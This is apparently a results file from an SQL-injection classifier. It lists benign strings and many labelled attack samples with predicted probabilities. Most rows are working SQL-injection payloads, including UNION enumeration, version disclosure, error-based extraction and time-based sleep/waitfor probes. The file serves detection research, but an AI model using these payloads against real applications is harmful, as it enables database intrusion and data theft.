text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
clivosa,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30827,0,0,1.2877851986559108e-05,1
13934213p,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30841,0,0,1.3056765055807773e-05,1
serna kovac,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30851,0,0,1.2664836503972765e-05,1
soffia,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30862,0,0,1.2846045137848705e-05,1
gaudet,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30870,0,0,1.3192241567594465e-05,1
gandolfo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30875,0,0,1.2895425243186764e-05,1
6398147509756321,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30879,0,0,1.4683733752463013e-05,1
8956108015903904,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30896,0,0,1.745964982546866e-05,1
piette,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30909,0,0,1.272817280550953e-05,1
94409893e,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30911,0,0,1.308632181462599e-05,1
7840792716096931,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30932,0,0,2.18886216316605e-05,1
sanzana,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30943,0,0,1.3037928511039354e-05,1
bulay vallejo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30952,0,0,1.2696337762463372e-05,1
presbiteriano,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30956,0,0,1.2934886399307288e-05,1
yeti llamus,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,30965,0,0,1.2772421541740187e-05,1
"select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999927282333374,1
"select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999929666519165,1
"select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.9999929666519165,1
"select * from users where id  =  '1' union select \#,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999927282333374,1
"select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.9999927282333374,1
update,sajid576/sql-injection-dataset,30977,1,1,0.999975323677063,1
"select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.9999927282333374,1
"select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999929666519165,1
"select * from users where id  =  '1' +   (  \.  )   union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.999993085861206,1
"1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",sajid576/sql-injection-dataset,30984,1,1,0.9999932050704956,1
"1""   )    )    as fhlg where 1004  =  1004 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",sajid576/sql-injection-dataset,263,1,1,0.9999933242797852,1
select   (  case when   (  5569  =  9390  )   then 5569 else 1/  (  select 0  )   end  )  --,sajid576/sql-injection-dataset,31001,1,1,0.9999932050704956,1
-8963  )   where 8528  =  8528 or   (  2470  =  3271  )  *3271--,sajid576/sql-injection-dataset,31010,1,1,0.9999932050704956,1
"-9929'  )   as gbtc where 8162  =  8162 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
1 where 4844  =  4844,sajid576/sql-injection-dataset,31024,1,1,0.9999927282333374,1
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'tmwy'  =  'tmwy",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1'||  (  select 'ufgs' where 9670  =  9670 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1  )   and   (  3020  =  3020  )  *6703 and   (  9831  =  9831,sajid576/sql-injection-dataset,31037,1,1,0.9999932050704956,1
"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",sajid576/sql-injection-dataset,31039,1,1,0.9999932050704956,1
-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  1248  =  1248,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"-5439"" or 2559  =  4692 and ""dcrf"" like ""dcrf",sajid576/sql-injection-dataset,31046,1,1,0.999993085861206,1
"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999932050704956,1
"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
"-2375 union all select 1573,1573,1573,1573#",sajid576/sql-injection-dataset,31057,1,1,0.9999916553497314,1
"-3362' where 6567  =  6567 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '",sajid576/sql-injection-dataset,31072,1,1,0.9999932050704956,1
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""exgr"" like ""exgr",sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1""  )   where 4739  =  4739 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1%'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
select   (  case when   (  5163  =  4861  )   then 1 else 5163*  (  select 5163 from master..sysdatabases  )   end  )  --,sajid576/sql-injection-dataset,31083,1,1,0.9999932050704956,1
"1   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  7589  =  7589",sajid576/sql-injection-dataset,311,1,1,0.999993085861206,1
"-6815 where 7609  =  7609 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,sajid576/sql-injection-dataset,31094,1,1,0.9999932050704956,1
-3450' where 4478  =  4478 or 9323  =  9323#,sajid576/sql-injection-dataset,31107,1,1,0.999993085861206,1
-3613%'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,sajid576/sql-injection-dataset,31116,1,1,0.999993085861206,1
"1',  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1'  )   where 1502  =  1502 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
1'   )    )    as wuws where 6917  =  6917 union all select null#,sajid576/sql-injection-dataset,31127,1,1,0.999993085861206,1
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
"1   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  9401  =  9401",sajid576/sql-injection-dataset,311,1,1,0.999993085861206,1
"select * from generate_series  (  7610,7610,case when   (  7610  =  9416  )   then 1 else 0 end  )   limit 1--",sajid576/sql-injection-dataset,31138,1,1,0.999993085861206,1
"-6200' where 9150  =  9150 union all select 9150,9150,9150,9150,9150,9150,9150#",sajid576/sql-injection-dataset,31140,1,1,0.9999929666519165,1
1%'   )    )     )   waitfor delay '0:0:5'--,sajid576/sql-injection-dataset,114,1,1,0.999993085861206,1
"-2722""  )   or 4907  =  8126#",sajid576/sql-injection-dataset,31150,1,1,0.999993085861206,1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ),sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"-3270%' or elt  (  9404  =  3498,3498  )   and '%'  =  '",sajid576/sql-injection-dataset,31164,1,1,0.9999932050704956,1
"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu",sajid576/sql-injection-dataset,31179,1,1,0.9999933242797852,1
"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",sajid576/sql-injection-dataset,31187,1,1,0.9999932050704956,1
"1  )   where 4810  =  4810 union all select null,null#",sajid576/sql-injection-dataset,31197,1,1,0.999992847442627,1
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""xopd""  =  ""xopd",sajid576/sql-injection-dataset,31200,1,1,0.999993085861206,1
"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,31208,1,1,0.9999929666519165,1
-1641'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'vgcb' like 'vgcb,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,sajid576/sql-injection-dataset,31230,1,1,0.9999932050704956,1
1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',sajid576/sql-injection-dataset,31241,1,1,0.9999932050704956,1
"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",sajid576/sql-injection-dataset,31242,1,1,0.9999932050704956,1
1%'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  '%'  =  ',sajid576/sql-injection-dataset,229,1,1,0.999993085861206,1
"-6254%'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
"select pg_sleep  (  5  )   and ""ilyw"" like ""ilyw",sajid576/sql-injection-dataset,31255,1,1,0.9999926090240479,1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # sipo,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1  )   where 5378  =  5378 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1' where 2391  =  2391 union all select null,null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,31266,1,1,0.999993085861206,1
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-5391 or make_set  (  9354  =  9354,7185  )  # ptyy",sajid576/sql-injection-dataset,31280,1,1,0.9999932050704956,1
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""pwwb"" like ""pwwb",sajid576/sql-injection-dataset,31289,1,1,0.9999932050704956,1
"-8557 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
1'  )   as wpmv where 1479  =  1479 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'lxoc'  =  'lxoc",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-8655  )   where 3910  =  3910 union all select 3910,3910#",sajid576/sql-injection-dataset,31302,1,1,0.999993085861206,1
"-4095'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
"-3626%""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",sajid576/sql-injection-dataset,31311,1,1,0.999993085861206,1
1'  )   where 5616  =  5616,sajid576/sql-injection-dataset,31314,1,1,0.999993085861206,1
1%'  )   waitfor delay '0:0:5'--,sajid576/sql-injection-dataset,114,1,1,0.9999929666519165,1
"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",sajid576/sql-injection-dataset,31324,1,1,0.9999932050704956,1
"-9098' union all select 3476,3476,3476,3476,3476,3476#",sajid576/sql-injection-dataset,31334,1,1,0.999992847442627,1
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'ajka'  =  'ajka,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",sajid576/sql-injection-dataset,31344,1,1,0.999993085861206,1
"-3063%""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",sajid576/sql-injection-dataset,31351,1,1,0.9999933242797852,1
"-4032""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""olox""  =  ""olox",sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"1%' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
